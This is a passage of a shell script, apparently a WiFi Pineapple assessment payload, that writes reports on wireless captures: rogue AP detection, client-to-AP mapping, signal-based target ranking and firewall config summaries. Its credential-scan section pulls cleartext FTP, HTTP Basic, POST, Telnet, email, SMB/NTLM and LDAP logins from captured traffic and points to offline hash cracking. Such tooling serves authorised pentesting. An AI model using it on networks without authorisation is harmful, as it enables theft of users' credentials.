                            c=0; for(b in bssids[s]) c++
                            if(c>1) dup++
                        }
                        print dup
                    }' /tmp/rogue_detection.txt)
                    echo "  SSIDs with Multiple BSSIDs: $duplicate_ssids"

                    if [ "$duplicate_ssids" -gt 0 ]; then
                        echo ""
                        echo "INVESTIGATION TIPS:"
                        echo "  - Compare signal strengths (rogues often closer/stronger)"
                        echo "  - Check for encryption mismatches (rogue may use open/WEP)"
                        echo "  - Monitor for deauth attacks (forcing clients to rogue AP)"
                        echo "  - Verify MAC OUI (rogue may use different vendor)"
                    fi

                    rm -f /tmp/rogue_detection.txt
                else
                    echo "No SSIDs detected"
                fi
            else
                echo "[!] tcpdump not available"
            fi

        } > "${REPORT_DIR}/security_analysis/05_rogue_ap_detection.txt"
        LOG "    [OK] Rogue AP detection complete"

        # ========================================================================
        # 6. CLIENT-AP ASSOCIATION MAPPING
        # ========================================================================
        {
            echo "═══════════════════════════════════════════════════════════════"
            echo "  CLIENT-TO-AP ASSOCIATION MAPPING"
            echo "═══════════════════════════════════════════════════════════════"
            echo "Timestamp: $(date)"
            echo ""
            echo "DESCRIPTION:"
            echo "  Maps which client devices are connecting to which access points"
            echo "  by analyzing association request/response frames."
            echo ""
            echo "PENTESTING VALUE:"
            echo "  - Identify high-value targets (devices on corporate APs)"
            echo "  - Track client movement between APs"
            echo "  - Identify most active clients for targeted attacks"
            echo ""

            if check_tool tcpdump; then
                echo "Active Client Associations:"
                echo "────────────────────────────────────────────────────────────"

                # Extract association requests/responses using tcpdump
                tcpdump -r "$MAIN_PCAP" -e -v 'type mgt subtype assoc-req or type mgt subtype assoc-resp' 2>/dev/null | \
                    awk '
                    /SA:/ {
                        for (i=1; i<=NF; i++) {
                            if ($i ~ /^SA:/) { sa = $i; sub(/SA:/, "", sa) }
                            if ($i ~ /^DA:/) { da = $i; sub(/DA:/, "", da) }
                            if ($i ~ /^BSSID:/) { bssid = $i; sub(/BSSID:/, "", bssid) }
                        }
                    }
                    /Assoc/ {
                        if (sa != "" && bssid != "") {
                            print sa, bssid
                        }
                    }' | sort -u > /tmp/associations.txt

                if [ -s /tmp/associations.txt ]; then
                    awk '{
                        client = $1
                        bssid = $2

                        if (client != "" && bssid != "" && client != bssid) {
                            client_aps[client][bssid] = 1
                            client_count[client]++
                            ap_clients[bssid][client] = 1
                        }
                    }
                    END {
                        # Show by client
                        print "BY CLIENT DEVICE:"
                        print "────────────────────────────────────────────────────────────"
                        for (client in client_count) {
                            printf "\n  Client: %s\n", client
                            for (bssid in client_aps[client]) {
                                printf "    → Associated with: %s\n", bssid
                            }
                        }

                        print "\n\n"
                        print "BY ACCESS POINT:"
                        print "────────────────────────────────────────────────────────────"
                        for (bssid in ap_clients) {
                            client_cnt = 0
                            for (c in ap_clients[bssid]) client_cnt++

                            printf "\n  AP: %s (%d clients)\n", bssid, client_cnt
                            for (client in ap_clients[bssid]) {
                                printf "    ← %s\n", client
                            }
                        }
                    }' /tmp/associations.txt

                    echo ""
                    echo "STATISTICS:"
                    unique_clients=$(awk '{print $1}' /tmp/associations.txt | sort -u | wc -l | tr -d ' ')
                    unique_aps=$(awk '{print $2}' /tmp/associations.txt | sort -u | wc -l | tr -d ' ')
                    echo "  Unique Clients: $unique_clients"
                    echo "  Unique APs: $unique_aps"
                    echo "  Total Association Events: $(wc -l < /tmp/associations.txt | tr -d ' ')"

                    rm -f /tmp/associations.txt
                else
                    echo "No association frames captured"
                    echo ""
                    echo "This means:"
                    echo "  - No clients connected during capture"
                    echo "  - Only already-connected clients present"
                fi
            else
                echo "[!] tcpdump not available"
            fi

        } > "${REPORT_DIR}/security_analysis/06_client_ap_mapping.txt"
        LOG "    [OK] Client-AP mapping complete"

        # ========================================================================
        # 7. SIGNAL STRENGTH & PROXIMITY ANALYSIS
        # ========================================================================
        {
            echo "═══════════════════════════════════════════════════════════════"
            echo "  SIGNAL STRENGTH & PROXIMITY ANALYSIS"
            echo "═══════════════════════════════════════════════════════════════"
            echo "Timestamp: $(date)"
            echo ""
            echo "DESCRIPTION:"
            echo "  Analyzes signal strength to estimate physical proximity and"
            echo "  identify strongest/closest targets for attacks."
            echo ""
            echo "SIGNAL INTERPRETATION:"
            echo "  -30 to -50 dBm: Excellent (very close, <5m)"
            echo "  -50 to -60 dBm: Good (close, 5-15m)"
            echo "  -60 to -70 dBm: Fair (medium, 15-30m)"
            echo "  -70 to -80 dBm: Weak (far, 30-50m)"
            echo "  -80 to -90 dBm: Very Weak (very far, >50m)"
            echo ""
            echo "PENTESTING VALUE:"
            echo "  - Prioritize closest/strongest APs for attacks"
            echo "  - Estimate attacker proximity if rogue AP detected"
            echo "  - Identify mobile hotspots (varying signal)"
            echo ""

            if check_tool tcpdump; then
                echo "Access Points by Signal Strength (Strongest First):"
                echo "────────────────────────────────────────────────────────────"

                # Get signal strength for each BSSID using tcpdump
                # Note: tcpdump with -v shows signal in radiotap header
                tcpdump -r "$MAIN_PCAP" -e -v 'type mgt subtype beacon' 2>/dev/null | \
                    awk '
                    /signal/ {
                        for (i=1; i<=NF; i++) {
                            if ($i ~ /dBm/) {
                                signal = $(i-1)
                                gsub(/[^0-9-]/, "", signal)
                            }
                        }
                    }
                    /BSSID:/ { bssid = $NF }
                    /Beacon \(/ {
                        ssid = $0
                        sub(/.*Beacon \(/, "", ssid)
                        sub(/\).*/, "", ssid)
                        if (bssid != "" && signal != "") {
                            print bssid, ssid, signal
                        }
                    }' > /tmp/signal_analysis.txt

                if [ -s /tmp/signal_analysis.txt ]; then
                    awk '{
                        bssid = $1
                        signal = $NF
                        ssid = $0
                        sub(/^[^ ]+ /, "", ssid)
                        sub(/ [^ ]+$/, "", ssid)

                        if (bssid != "" && signal != "" && signal ~ /^-?[0-9]+$/) {
                            signal = int(signal)
                            if (min_signal[bssid] == "" || signal < min_signal[bssid]) {
                                min_signal[bssid] = signal
                            }
                            if (max_signal[bssid] == "" || signal > max_signal[bssid]) {
                                max_signal[bssid] = signal
                            }
                            sum_signal[bssid] += signal
                            count_signal[bssid]++
                            ssid_map[bssid] = ssid
                        }
                    }
                    END {
                        for (bssid in max_signal) {
                            avg = sum_signal[bssid] / count_signal[bssid]
                            proximity = ""
                            if (max_signal[bssid] >= -50) proximity = "VERY CLOSE"
                            else if (max_signal[bssid] >= -60) proximity = "CLOSE"
                            else if (max_signal[bssid] >= -70) proximity = "MEDIUM"
                            else if (max_signal[bssid] >= -80) proximity = "FAR"
                            else proximity = "VERY FAR"

                            ssid = ssid_map[bssid]
                            ssid_str = (ssid != "" ? ssid : "Hidden")

                            printf "%d|%s|%s|%d|%d|%.1f|%s\n", \
                                max_signal[bssid], bssid, ssid_str, \
                                min_signal[bssid], max_signal[bssid], avg, proximity
                        }
                    }' /tmp/signal_analysis.txt | \
                    sort -t'|' -rn -k1 | \
                    awk -F'|' '{
                        printf "\n  BSSID: %s\n", $2
                        printf "  SSID: %s\n", $3
                        printf "  Signal Range: %d to %d dBm (Avg: %.1f dBm)\n", $4, $5, $6
                        printf "  Proximity: %s\n", $7

                        if ($5 >= -50) {
                            printf "  ⚠ PRIORITY TARGET: Very close, excellent signal\n"
                        }
                    }'

                    echo ""
                    echo "STATISTICS:"
                    total_aps=$(cat /tmp/signal_analysis.txt | awk '{print $1}' | sort -u | wc -l | tr -d ' ')
                    echo "  Total APs with Signal Data: $total_aps"

                    rm -f /tmp/signal_analysis.txt
                else
                    echo "No signal data available"
                    echo "(Signal strength may not be captured in all pcap formats)"
                fi
            else
                echo "[!] tcpdump not available"
            fi

        } > "${REPORT_DIR}/security_analysis/07_signal_proximity_analysis.txt"
        LOG "    [OK] Signal strength analysis complete"

        # ========================================================================
        # SECURITY ANALYSIS SUMMARY
        # ========================================================================
        {
            echo "═══════════════════════════════════════════════════════════════"
            echo "  WIFI SECURITY ANALYSIS SUMMARY"
            echo "═══════════════════════════════════════════════════════════════"
            echo "Generated: $(date)"
            echo "Scan Duration: ${PCAP_TIME} seconds"
            echo ""

            echo "ANALYSIS REPORTS GENERATED:"
            echo "  1. Client Probe Intelligence"
            echo "  2. Hidden SSID Detection"
            echo "  3. WPA Handshake Detection"
            echo "  4. Encryption Weakness Analysis"
            echo "  5. Rogue AP Detection"
            echo "  6. Client-AP Association Mapping"
            echo "  7. Signal Strength & Proximity Analysis"
            echo ""

            echo "CRITICAL FINDINGS:"

            # Check for WEP
            if grep -q "\[WEP\]" "${REPORT_DIR}/security_analysis/04_encryption_analysis.txt" 2>/dev/null; then
                echo "  ✗ WEP encryption detected (CRITICAL - trivially crackable)"
            fi

            # Check for WPS
            if grep -q "WPS ENABLED" "${REPORT_DIR}/security_analysis/04_encryption_analysis.txt" 2>/dev/null; then
                echo "  ⚠ WPS-enabled networks detected (vulnerable to brute force)"
            fi

            # Check for handshakes
            if grep -q "LIKELY COMPLETE" "${REPORT_DIR}/security_analysis/03_wpa_handshake_detection.txt" 2>/dev/null; then
                echo "  ℹ Complete WPA handshakes captured (can attempt offline cracking)"
            fi

            # Check for rogue APs
            rogue_count=$(grep -c "Could be evil twin" "${REPORT_DIR}/security_analysis/05_rogue_ap_detection.txt" 2>/dev/null || echo 0)
            if [ "$rogue_count" -gt 0 ]; then
                echo "  ⚠ Potential rogue/evil twin APs detected: $rogue_count"
            fi

            # Check for deauth attacks
            if grep -q "SUSPICIOUS" "${REPORT_DIR}/analysis/deauth_detection.txt" 2>/dev/null; then
                echo "  ⚠ Suspicious deauthentication activity (possible attack in progress)"
            fi

            echo ""
            echo "FILES LOCATION:"
            echo "  ${REPORT_DIR}/security_analysis/"
            echo ""

        } > "${REPORT_DIR}/security_analysis/00_SUMMARY.txt"

        LOG "    [OK] Security analysis summary generated"
        LOG ""
        LOG "[✓] WiFi Security Analysis Complete"
        LOG "    Reports saved to: ${REPORT_DIR}/security_analysis/"

    else
        LOG "    [!] No wireless capture file found - skipping security analysis"
    fi
fi

# ============================================================================
# CREDENTIAL & SENSITIVE DATA DETECTION
# ============================================================================

if [ "$ENABLE_CREDENTIAL_SCAN" = true ]; then
    LOG ""
    LOG "[*] Scanning for credentials and sensitive data..."

    {
        echo "=== CREDENTIAL & SENSITIVE DATA DETECTION ==="
        echo "Timestamp: $(date)"
        echo ""
        echo "!!! WARNING: This section may contain sensitive information !!!"
        echo "!!! Handle with appropriate security measures !!!"
        echo ""

        for pcap in "${REPORT_DIR}"/pcaps/*.pcap; do
            if [ -f "$pcap" ]; then
                filename=$(basename "$pcap")
                echo "========================================"
                echo "FILE: $filename"
                echo "========================================"
                echo ""

                # Check if pcap has IP traffic
                ip_count=$(tcpdump -r "$pcap" ip 2>/dev/null | wc -l | tr -d ' ')
                if [ "$ip_count" -eq 0 ]; then
                    echo "  [Skip] No IP-layer traffic (monitor mode capture)"
                    echo "  Credential extraction requires IP-layer protocols"
                    echo ""
                    continue
                fi

                # FTP Credentials
                echo "** FTP CREDENTIALS **"
                ftp_data=$(tcpdump -A -n -r "$pcap" 'tcp port 21' 2>/dev/null | strings | grep -E "USER |PASS ")
                if [ -n "$ftp_data" ]; then
                    echo "  [!] FTP credentials detected!"
                    echo "$ftp_data" | grep "USER " | sed 's/.*USER /  Username: /' | head -10
                    echo "$ftp_data" | grep "PASS " | sed 's/.*PASS /  Password: /' | head -10
                else
                    echo "  None detected"
                fi
                echo ""

                # HTTP Basic Authentication
                echo "** HTTP BASIC AUTHENTICATION **"
                http_auth=$(tcpdump -A -n -r "$pcap" 'tcp port 80 or tcp port 8080' 2>/dev/null | strings | grep "Authorization: Basic ")
                if [ -n "$http_auth" ]; then
                    echo "  [!] HTTP Basic Auth detected!"
                    echo "$http_auth" | while read line; do
                        auth_string=$(echo "$line" | sed 's/.*Authorization: Basic //' | awk '{print $1}')
                        if [ -n "$auth_string" ]; then
                            decoded=$(echo "$auth_string" | base64 -d 2>/dev/null)
                            [ -n "$decoded" ] && echo "  Credentials: $decoded"
                        fi
                    done
                else
                    echo "  None detected"
                fi
                echo ""

                # HTTP POST Data (form submissions)
                echo "** HTTP POST DATA (Form Submissions) **"
                post_data=$(tcpdump -A -n -r "$pcap" 'tcp port 80 or tcp port 8080' 2>/dev/null | strings | grep -iE "password=|user=|username=|login=|email=" | head -10)
                if [ -n "$post_data" ]; then
                    echo "  [!] POST data with potential credentials detected!"
                    echo "$post_data"
                else
                    echo "  None detected"
                fi
                echo ""

                # Telnet Traffic
                echo "** TELNET CREDENTIALS **"
                telnet_data=$(tcpdump -A -n -r "$pcap" 'tcp port 23' 2>/dev/null | strings | grep -iE "login|password|username" | head -10)
                if [ -n "$telnet_data" ]; then
                    echo "  [!] Telnet authentication data detected!"
                    echo "$telnet_data"
                else
                    echo "  None detected"
                fi
                echo ""

                # SMTP Authentication
                echo "** SMTP AUTHENTICATION **"
                smtp_auth=$(tcpdump -A -n -r "$pcap" 'tcp port 25 or tcp port 587' 2>/dev/null | strings | grep "AUTH ")
                if [ -n "$smtp_auth" ]; then
                    echo "  [!] SMTP authentication detected!"
                    echo "$smtp_auth" | head -10
                else
                    echo "  None detected"
                fi
                echo ""

                # POP3/IMAP Credentials
                echo "** POP3/IMAP CREDENTIALS **"
                pop_data=$(tcpdump -A -n -r "$pcap" 'tcp port 110' 2>/dev/null | strings | grep -E "USER |PASS ")
                imap_data=$(tcpdump -A -n -r "$pcap" 'tcp port 143' 2>/dev/null | strings | grep "LOGIN")

                if [ -n "$pop_data" ] || [ -n "$imap_data" ]; then
                    echo "  [!] Email credentials detected!"
                    [ -n "$pop_data" ] && echo "$pop_data" | head -5
                    [ -n "$imap_data" ] && echo "$imap_data" | head -5
                else
                    echo "  None detected"
                fi
                echo ""

                # SMB/NTLM Traffic - Enhanced Analysis
                echo "** SMB/NTLM AUTHENTICATION **"
                smb_traffic=$(tcpdump -A -n -r "$pcap" 'tcp port 445 or tcp port 139' 2>/dev/null)

                if [ -n "$smb_traffic" ]; then
                    smb_strings=$(echo "$smb_traffic" | strings)

                    # Check for NTLMSSP (NTLM Security Support Provider)
                    ntlmssp=$(echo "$smb_strings" | grep -i "NTLMSSP" | head -5)
                    if [ -n "$ntlmssp" ]; then
                        echo "  [!] NTLM authentication detected!"
                        echo ""
                    fi

                    # Extract usernames from SMB session setup
                    smb_users=$(echo "$smb_strings" | grep -oE '[A-Za-z0-9_\.-]+\\[A-Za-z0-9_\.-]+' | sort -u | head -10)
                    if [ -n "$smb_users" ]; then
                        echo "  [!] SMB Usernames (DOMAIN\\USER format):"
                        echo "$smb_users" | sed 's/^/      /'
                        echo ""
                    fi

                    # Extract domain/workstation names
                    domains=$(echo "$smb_strings" | grep -iE "Domain:|Workstation:|WORKGROUP|\.local" | sort -u | head -10)
                    if [ -n "$domains" ]; then
                        echo "  [!] Domains/Workstations detected:"
                        echo "$domains" | sed 's/^/      /'
                        echo ""
                    fi

                    # Look for share access patterns (\\server\share)
                    shares=$(echo "$smb_strings" | grep -oE '\\\\[A-Za-z0-9_\.-]+\\[A-Za-z0-9_\$\.-]+' | sort -u | head -10)
                    if [ -n "$shares" ]; then
                        echo "  [!] SMB Shares accessed:"
                        echo "$shares" | sed 's/^/      /'
                        echo ""
                    fi

                    # Look for file paths in SMB traffic
                    filepaths=$(echo "$smb_strings" | grep -oE '[A-Za-z]:\\[A-Za-z0-9_\\ \.-]+' | sort -u | head -10)
                    if [ -n "$filepaths" ]; then
                        echo "  [!] File paths detected:"
                        echo "$filepaths" | sed 's/^/      /'
                        echo ""
                    fi

                    # Check for SMBv1 (less secure, may have plaintext)
                    smbv1=$(echo "$smb_traffic" | strings | grep -i "SMB\|PC NETWORK PROGRAM" | head -3)
                    if [ -n "$smbv1" ]; then
                        echo "  [!] SMBv1 traffic detected (legacy protocol, potential security risk)"
                        echo ""
                    fi

                    # Extract potential plaintext passwords (SMBv1 without encryption)
                    # Look for common password field patterns
                    plaintext=$(echo "$smb_strings" | grep -iE "password|passwd|pwd=" | head -5)
                    if [ -n "$plaintext" ]; then
                        echo "  [!!!] POTENTIAL PLAINTEXT CREDENTIALS:"
                        echo "$plaintext" | sed 's/^/      /'
                        echo ""
                    fi

                    echo "  [*] For NTLM hash extraction, analyze pcap with:"
                    echo "      - Wireshark: File > Export Objects > SMB"
                    echo "      - hashcat/john for offline cracking"
                else
                    echo "  None detected"
                fi
                echo ""

                # Kerberos
                echo "** KERBEROS AUTHENTICATION **"
                kerberos=$(tcpdump -n -r "$pcap" 'tcp port 88 or udp port 88' 2>/dev/null | head -10)
                if [ -n "$kerberos" ]; then
                    echo "  [!] Kerberos authentication traffic detected!"
                    echo "  Kerberos packets found - may contain domain/realm information"
                    echo "  Use Wireshark for detailed Kerberos analysis"
                else
                    echo "  None detected"
                fi
                echo ""

                # LDAP
                echo "** LDAP AUTHENTICATION **"
                ldap=$(tcpdump -A -n -r "$pcap" 'tcp port 389' 2>/dev/null | strings | grep -iE "cn=|dc=|bindRequest" | head -10)
                if [ -n "$ldap" ]; then
                    echo "  [!] LDAP authentication detected!"
                    echo "$ldap"
                else
                    echo "  None detected"
                fi
                echo ""

                # Additional cleartext protocols
                echo "** OTHER CLEARTEXT PROTOCOLS **"
                echo -n "  VNC (5900): "
                vnc_count=$(tcpdump -r "$pcap" 'tcp port 5900' 2>/dev/null | wc -l)
                [ "$vnc_count" -gt 0 ] && echo "[!] $vnc_count packets (potential VNC traffic)" || echo "None"

                echo -n "  MySQL (3306): "
                mysql_count=$(tcpdump -r "$pcap" 'tcp port 3306' 2>/dev/null | wc -l)
                [ "$mysql_count" -gt 0 ] && echo "[!] $mysql_count packets (potential database traffic)" || echo "None"

                echo -n "  PostgreSQL (5432): "
                pgsql_count=$(tcpdump -r "$pcap" 'tcp port 5432' 2>/dev/null | wc -l)
                [ "$pgsql_count" -gt 0 ] && echo "[!] $pgsql_count packets (potential database traffic)" || echo "None"

                echo -n "  Redis (6379): "
                redis_count=$(tcpdump -r "$pcap" 'tcp port 6379' 2>/dev/null | wc -l)
                [ "$redis_count" -gt 0 ] && echo "[!] $redis_count packets (potential Redis traffic)" || echo "None"
                echo ""

                echo ""
            fi
        done

        echo "========================================"
        echo "SUMMARY"
        echo "========================================"
        echo ""
        echo "Review this file carefully for exposed credentials."
        echo "Credentials transmitted in cleartext represent security vulnerabilities."
        echo ""
        echo "HIGH RISK PROTOCOLS DETECTED:"
        grep -q "detected!" "${REPORT_DIR}/credentials/credential_scan.txt" 2>/dev/null && {
            echo "  - Cleartext credentials found in traffic"
            echo "  - Recommend immediate password changes"
            echo "  - Enforce encrypted protocols (HTTPS, SFTP, etc.)"
        } || echo "  - No cleartext credentials detected"
        echo ""
        echo "NOTE: This scan uses tcpdump for basic credential detection."
        echo "For detailed analysis, open pcap files in Wireshark on your workstation."
        echo ""

    } > "${REPORT_DIR}/credentials/credential_scan.txt"

    # Set restrictive permissions on credential file
    chmod 600 "${REPORT_DIR}/credentials/credential_scan.txt"

    CRED_FINDINGS=$(grep -c "\[!\]" "${REPORT_DIR}/credentials/credential_scan.txt" 2>/dev/null); CRED_FINDINGS=${CRED_FINDINGS:-0}
    if [ "$CRED_FINDINGS" -gt 0 ]; then
        LOG "    [!!!] ${CRED_FINDINGS} credential findings - REVIEW IMMEDIATELY"
        # Add to severity scoring
        for i in $(seq 1 $CRED_FINDINGS); do
            add_finding "CRITICAL" "Cleartext credentials detected in network traffic"
        done
    else
        LOG "    [OK] No cleartext credentials detected"
    fi

else
    LOG "[!] Credential scan disabled"
fi

# ============================================================================
# LOG COLLECTION
# ============================================================================

LOG "[*] Collecting system logs..."

# System logs
[ -f /var/log/messages ] && cp /var/log/messages "${REPORT_DIR}/logs/" 2>/dev/null
[ -f /var/log/syslog ] && cp /var/log/syslog "${REPORT_DIR}/logs/" 2>/dev/null

# Dmesg
dmesg > "${REPORT_DIR}/logs/dmesg.log"

# WiFi Pineapple specific logs
cp /var/log/*.log "${REPORT_DIR}/logs/" 2>/dev/null

# PineAP logs if available
if [ -d /pineapple/modules/PineAP/log ]; then
    cp -r /pineapple/modules/PineAP/log "${REPORT_DIR}/logs/pineap_logs" 2>/dev/null
    LOG "    [OK] PineAP logs collected"
fi

LOG_COUNT=$(ls -1 "${REPORT_DIR}/logs/" 2>/dev/null | wc -l)
LOG "    [OK] Collected ${LOG_COUNT} log files"

# ============================================================================
# FIREWALL RULES (nftables/fw4 + iptables fallback)
# ============================================================================

LOG "[*] Capturing firewall configuration..."

{
    echo "=== FIREWALL CONFIGURATION ==="
    echo "Timestamp: $(date)"
    echo ""

    # Detect firewall backend
    if check_tool nft || check_tool fw4; then
        echo "Firewall Backend: nftables/fw4 (OpenWrt 22.03+)"
        echo ""

        # UCI firewall configuration
        echo "=== UCI FIREWALL CONFIG (/etc/config/firewall) ==="
        if [ -f /etc/config/firewall ]; then
            cat /etc/config/firewall
        else
            echo "[!] UCI firewall config not found"
        fi
        echo ""

        # Active nftables ruleset with counters
        echo "=== NFTABLES ACTIVE RULESET (nft list ruleset) ==="
        if check_tool nft; then
            nft list ruleset 2>/dev/null || echo "[!] Failed to list nft ruleset"
        else
            echo "[!] nft command not available"
        fi
        echo ""

        # fw4 print (nftables without counters - cleaner view)
        echo "=== FW4 RULESET (fw4 print) ==="
        if check_tool fw4; then
            fw4 print 2>/dev/null || echo "[!] Failed to run fw4 print"
        else
            echo "[!] fw4 command not available"
        fi
        echo ""

        # ================================================================
        # FIREWALL ANALYSIS SUMMARY (Plain English Breakdown)
        # ================================================================
        echo "═══════════════════════════════════════════════════════════════"
        echo "  FIREWALL ANALYSIS SUMMARY"
        echo "  (Plain English Breakdown)"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

        # Get the nft ruleset for analysis
        NFT_RULES=$(nft list ruleset 2>/dev/null)
        UCI_CONFIG=$(cat /etc/config/firewall 2>/dev/null)

        # --- Basic Info ---
        echo "📋 OVERVIEW"
        echo "────────────────────────────────────────────────────────────────"
        echo "  Firewall Type: nftables with fw4 (modern OpenWrt firewall)"
        echo ""
        echo "  What this means:"
        echo "    - nftables is the modern Linux firewall (replaces iptables)"
        echo "    - fw4 is OpenWrt's firewall framework that manages nftables"
        echo "    - Rules control what network traffic is allowed or blocked"
        echo ""

        # --- Zone Analysis ---
        echo "🌐 NETWORK ZONES"
        echo "────────────────────────────────────────────────────────────────"
        echo "  Zones are groups of network interfaces with shared rules."
        echo ""

        # Extract LAN info
        lan_devices=$(echo "$NFT_RULES" | grep -A1 "define lan_devices" | tail -1 | grep -oE '"[^"]+"' | tr -d '"' | tr '\n' ', ' | sed 's/,$//')
        if [ -z "$lan_devices" ]; then
            lan_devices=$(echo "$NFT_RULES" | grep 'iifname "br-lan"' | head -1 | grep -oE '"[^"]+"' | tr -d '"')
        fi
        lan_subnets=$(echo "$NFT_RULES" | grep -A1 "define lan_subnets" | tail -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+' | head -1)

        echo "  🏠 LAN Zone (Your local/client network):"
        echo "      Interfaces: ${lan_devices:-br-lan}"
        [ -n "$lan_subnets" ] && echo "      IP Range: $lan_subnets"
        echo "      Traffic Policy: Usually ACCEPT (trusted network)"
        echo ""

        # Extract WAN info
        wan_devices=$(echo "$NFT_RULES" | grep -A1 "define wan_devices" | tail -1 | grep -oE '"[^"]+"' | tr -d '"' | tr '\n' ', ' | sed 's/,$//')
        wan_subnets=$(echo "$NFT_RULES" | grep -A1 "define wan_subnets" | tail -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+' | head -1)

        echo "  🌍 WAN Zone (Internet/upstream network):"
        echo "      Interfaces: ${wan_devices:-eth1, wlan0cli}"
        [ -n "$wan_subnets" ] && echo "      IP Range: $wan_subnets"
        echo "      Traffic Policy: More restrictive (untrusted network)"
        echo ""

        # --- Default Policies ---
        echo "🛡️  DEFAULT POLICIES"
        echo "────────────────────────────────────────────────────────────────"
        echo "  These determine what happens to traffic that doesn't match"
        echo "  any specific rule."
        echo ""

        input_policy=$(echo "$NFT_RULES" | grep "chain input {" -A2 | grep "policy" | grep -oE "(accept|drop|reject)")
        forward_policy=$(echo "$NFT_RULES" | grep "chain forward {" -A2 | grep "policy" | grep -oE "(accept|drop|reject)")
        output_policy=$(echo "$NFT_RULES" | grep "chain output {" -A2 | grep "policy" | grep -oE "(accept|drop|reject)")

        echo "  INPUT (traffic TO the Pineapple):   ${input_policy:-accept}"
        echo "  FORWARD (traffic THROUGH Pineapple): ${forward_policy:-drop}"
        echo "  OUTPUT (traffic FROM the Pineapple): ${output_policy:-accept}"
        echo ""
        echo "  Interpretation:"
        [ "$forward_policy" = "drop" ] && echo "    ✓ Forward policy is DROP - good security default"
        [ "$input_policy" = "accept" ] && echo "    ⚠ Input policy is ACCEPT - relies on specific rules for protection"
        echo ""

        # --- NAT/Masquerade ---
        echo "🔀 NAT (Network Address Translation)"
        echo "────────────────────────────────────────────────────────────────"
        echo "  NAT allows devices on LAN to access the internet through"
        echo "  the Pineapple's WAN connection."
        echo ""

        if echo "$NFT_RULES" | grep -qi "masquerade"; then
            echo "  ✓ MASQUERADE is ENABLED"
            echo ""
            echo "  What this means:"
            echo "    - Clients connected to the Pineapple CAN access the internet"
            echo "    - Their traffic appears to come from the Pineapple's IP"
            echo "    - This is normal for a WiFi access point or router"
            masq_ifaces=$(echo "$NFT_RULES" | grep -B5 "masquerade" | grep "oifname" | grep -oE '"[^"]+"' | tr -d '"' | tr '\n' ', ' | sed 's/,$//')
            [ -n "$masq_ifaces" ] && echo "    - Masquerading on: $masq_ifaces"
        else
            echo "  ✗ MASQUERADE is DISABLED or not detected"
            echo ""
            echo "  What this means:"
            echo "    - Clients may NOT be able to access the internet"
            echo "    - Or NAT is configured differently (SNAT)"
        fi
        echo ""

        # --- SYN Flood Protection ---
        echo "🚫 DDOS PROTECTION"
        echo "────────────────────────────────────────────────────────────────"

        if echo "$NFT_RULES" | grep -q "syn_flood"; then
            syn_rate=$(echo "$NFT_RULES" | grep -A2 "chain syn_flood" | grep "limit rate" | grep -oE "[0-9]+/second")
            echo "  ✓ SYN Flood Protection: ENABLED"
            [ -n "$syn_rate" ] && echo "    Rate limit: $syn_rate"
            echo ""
            echo "  What this means:"
            echo "    - Protection against SYN flood DDoS attacks"
            echo "    - Excessive connection attempts are dropped"
        else
            echo "  ✗ SYN Flood Protection: Not detected"
        fi
        echo ""

        # --- Access Control Rules ---
        echo "🚪 ACCESS CONTROL (Open Ports & Services)"
        echo "────────────────────────────────────────────────────────────────"
        echo "  These rules control what services are accessible."
        echo ""

        # Check for admin/SSH restrictions
        if echo "$NFT_RULES" | grep -q "Allow-Admin-USBC\|Allow-SSH-USBC"; then
            echo "  🔐 ADMIN PANEL (Port 1471):"
            echo "      - Accessible via USB-C connection: ✓"
            echo "      - Accessible via Management interface: ✓"
            echo "      - Accessible from other WAN sources: ✗ BLOCKED"
            echo ""
            echo "  🔐 SSH (Port 22):"
            echo "      - Accessible via USB-C connection: ✓"
            echo "      - Accessible via Management interface: ✓"
            echo "      - Accessible from other WAN sources: ✗ BLOCKED"
            echo ""
            echo "  ✓ Good Security: Admin access is restricted to trusted interfaces"
        fi
        echo ""

        # Check allowed protocols
        echo "  📡 ALLOWED PROTOCOLS FROM WAN:"
        echo "$NFT_RULES" | grep "input_wan" -A50 | grep "accept comment" | grep -oE '!fw4: [^"]+' | sed 's/!fw4: /      ✓ /' | head -10
        echo ""

        # --- Traffic Counters ---
        echo "📊 TRAFFIC STATISTICS"
        echo "────────────────────────────────────────────────────────────────"
        echo "  Packet counters show how much traffic has matched each rule."
        echo ""

        lan_packets=$(echo "$NFT_RULES" | grep "accept_from_lan" -A3 | grep "counter packets" | grep -oE "packets [0-9]+" | awk '{print $2}')
        wan_packets=$(echo "$NFT_RULES" | grep "accept_from_wan" -A3 | grep "counter packets" | grep -oE "packets [0-9]+" | awk '{print $2}')

        [ -n "$lan_packets" ] && echo "  LAN → Pineapple: $lan_packets packets"
        [ -n "$wan_packets" ] && echo "  WAN → Pineapple: $wan_packets packets"
        echo ""

        # --- Security Assessment ---
        echo "🎯 SECURITY ASSESSMENT"
        echo "────────────────────────────────────────────────────────────────"
        echo ""

        sec_issues=0

        # Check for security concerns
        if [ "$forward_policy" = "accept" ]; then
            echo "  ⚠ WARNING: Forward policy is ACCEPT (allows all forwarding)"
            sec_issues=$((sec_issues + 1))
        else
            echo "  ✓ Forward policy is restrictive (DROP)"
        fi

        if echo "$NFT_RULES" | grep -qi "masquerade"; then
            echo "  ✓ NAT/Masquerade is properly configured"
        else
            echo "  ⚠ WARNING: NAT may not be configured"
            sec_issues=$((sec_issues + 1))
        fi

        if echo "$NFT_RULES" | grep -q "syn_flood"; then
            echo "  ✓ DDoS protection (SYN flood) is enabled"
        else
            echo "  ⚠ WARNING: No SYN flood protection detected"
            sec_issues=$((sec_issues + 1))
        fi

        if echo "$NFT_RULES" | grep -q "Reject-Admin\|Reject-SSH"; then
            echo "  ✓ Admin/SSH access is restricted"
        else
            echo "  ⚠ WARNING: Admin/SSH may be exposed to WAN"
            sec_issues=$((sec_issues + 1))
        fi

        if echo "$NFT_RULES" | grep -q "ct state invalid.*drop"; then
            echo "  ✓ Invalid connection states are dropped (NAT leak prevention)"
        fi

        echo ""
        if [ "$sec_issues" -eq 0 ]; then
            echo "  ══════════════════════════════════════════"
            echo "  RESULT: Firewall configuration looks GOOD"
            echo "  ══════════════════════════════════════════"
        else
            echo "  ══════════════════════════════════════════"
            echo "  RESULT: $sec_issues potential issue(s) found"
            echo "  ══════════════════════════════════════════"
        fi
        echo ""

        # --- Quick Reference ---
        echo "📖 QUICK REFERENCE"
        echo "────────────────────────────────────────────────────────────────"
        echo "  Common terms explained:"
        echo ""
        echo "  • ACCEPT  = Allow the traffic through"
